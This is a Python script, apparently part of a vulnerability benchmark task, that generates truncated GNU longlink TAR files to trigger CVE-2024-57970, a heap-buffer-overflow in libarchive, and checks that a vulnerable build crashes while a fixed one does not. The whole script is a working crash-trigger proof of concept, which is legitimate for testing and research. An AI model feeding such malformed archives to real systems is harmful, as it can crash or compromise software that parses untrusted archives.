#!/usr/bin/env python3
"""
Create a final_base.tar that triggers CVE-2024-57970.
This is a truncated GNU longlink TAR that crashes vuln but not fixed.
"""

import tarfile
import io
import subprocess
from pathlib import Path

def create_exploit_seed(output_path: Path, truncate_at: int = 768):
    """
    Create a GNU longlink TAR and truncate it to trigger the vulnerability.
    
    Args:
        output_path: Where to save the exploit TAR
        truncate_at: Byte offset to truncate at (default 768 = mid-linkname)
    """
    print(f"Creating exploit seed truncated at {truncate_at} bytes...")
    
    # Create a full GNU longlink TAR in memory
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode='w', format=tarfile.GNU_FORMAT) as tar:
        # Create a file with long name (159 chars forces GNU longlink)
        long_name = 'a' * 159
        
        info = tarfile.TarInfo(name=long_name)
        info.mtime = 0  # Deterministic
        info.uid = 0
        info.gid = 0
        info.uname = ""
        info.gname = ""
        info.size = 4099  # 4KB content
        
        # Content
        content = b"EXPLOIT\n" * 512  # 4096 bytes
        content += b"END"  # 4099 total
        
        tar.addfile(info, io.BytesIO(content))
    
    # Get full TAR data
    full_data = buffer.getvalue()
    print(f"Full TAR size: {len(full_data)} bytes")
    
    # Truncate to trigger vulnerability
    truncated_data = full_data[:truncate_at]
    print(f"Truncated to: {len(truncated_data)} bytes")
    
    # Write truncated TAR
    output_path.write_bytes(truncated_data)
    print(f"‚úì Wrote {output_path}")
    
    return truncated_data

def validate_structure(tar_path: Path):
    """Show structure of the truncated TAR."""
    data = tar_path.read_bytes()
    size = len(data)
    
    print(f"\nüìä Structure of {tar_path.name}:")
    print(f"   Total size: {size} bytes")
    print(f"   Blocks: {size // 512} full + {size % 512} partial")
    
    if size >= 512:
        print(f"   Block 0 (0-511): LongLink header")
    if size > 512:
        print(f"   Block 1+ ({512}-{size-1}): Linkname data (TRUNCATED)")
    
    # Check if it ends mid-block
    if size % 512 != 0:
        print(f"   ‚ö†Ô∏è  Truncated mid-block (incomplete {size % 512} bytes)")
    
    print()

def test_on_versions(tar_path: Path):
    """Test the exploit on both versions."""
    task_dir = Path("tasks/CVE-2024-57970_libarchive")
    
    print(f"üß™ Testing {tar_path.name} on both versions...\n")
    
    for service in ["target-vuln", "target-fixed"]:
        print(f"Testing {service}...")
        try:
            result = subprocess.run(
                ["python", "-m", "scripts.bench", "run", 
                 "CVE-2024-57970_libarchive", "--service", service, 
                 "--seed", str(tar_path)],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            exit_code = result.returncode
            has_asan = "AddressSanitizer" in result.stderr or "heap-buffer-overflow" in result.stderr
            
            print(f"  Exit code: {exit_code}")
            if has_asan:
                print(f"  ‚ö†Ô∏è  ASan: heap-buffer-overflow detected")
            else:
                print(f"  ‚úì No ASan errors")
            
            if service == "target-vuln":
                if exit_code == 139 and has_asan:
                    print(f"  ‚úÖ VULNERABLE: Crashes as expected (exit_code=139)")
                else:
                    print(f"  ‚ùå UNEXPECTED: Should crash with exit_code=139")
            else:
                if exit_code in [0, 1] and not has_asan:
                    print(f"  ‚úÖ FIXED: Handles gracefully (exit_code={exit_code})")
                else:
                    print(f"  ‚ùå UNEXPECTED: Should handle gracefully without crash")
            
            print()
            
        except subprocess.TimeoutExpired:
            print(f"  ‚è±Ô∏è  Timeout (possible hang)")
        except Exception as e:
            print(f"  ‚ùå Error: {e}")

def main():
    # Test different truncation points
    truncation_points = [
        (768, "Block boundary - reliable trigger"),
        (640, "Early in linkname"),
        (592, "Mid-linkname"),
    ]
    
    print("=" * 60)
    print("CVE-2024-57970 Exploit Seed Generator")
    print("=" * 60)
    print()
    
    # Try each truncation point
    for truncate_at, description in truncation_points:
        print(f"\n{'='*60}")
        print(f"Testing truncation at {truncate_at} bytes - {description}")
        print(f"{'='*60}\n")
        
        test_path = Path(f"test_exploit_{truncate_at}.tar")
        create_exploit_seed(test_path, truncate_at)
        validate_structure(test_path)
        test_on_versions(test_path)
        
        # Check if this one works
        print(f"Check results above. If this triggers the crash correctly,")
        print(f"we'll use it as final_base.tar\n")
    
    # Use 768 as default (most reliable)
    print(f"\n{'='*60}")
    print("Creating final_base.tar (truncated at 768 bytes)")
    print(f"{'='*60}\n")
    
    final_path = Path("tasks/CVE-2024-57970_libarchive/seeds/final_base.tar")
    create_exploit_seed(final_path, truncate_at=768)
    validate_structure(final_path)
    test_on_versions(final_path)
    
    print("\n" + "="*60)
    print(f"‚úì final_base.tar created at: {final_path}")
    print("="*60)

if __name__ == "__main__":
    main()
